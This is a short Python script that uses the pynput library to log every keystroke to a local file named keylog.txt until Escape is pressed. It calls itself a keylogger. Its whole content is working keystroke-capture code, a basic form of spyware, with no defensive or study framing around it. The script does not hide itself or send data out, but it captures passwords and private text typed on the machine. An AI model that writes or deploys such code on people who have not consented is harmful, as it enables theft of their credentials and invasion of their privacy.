import pynput
from pynput.keyboard import Key, Listener

# Log file path
log_file = "keylog.txt"

def on_press(key):
    """
    Callback function to handle key press events.

    Parameters:
    - key: The key that was pressed.
    """
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            if key == Key.space:
                f.write(" ")
            else:
                f.write(f" {key} ")

def on_release(key):
    """
    Callback function to handle key release events.

    Parameters:
    - key: The key that was released.
    """
    if key == Key.esc:
        # Stop listener
        return False

def main():
    """
    Main function to set up the keylogger listener.
    """
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
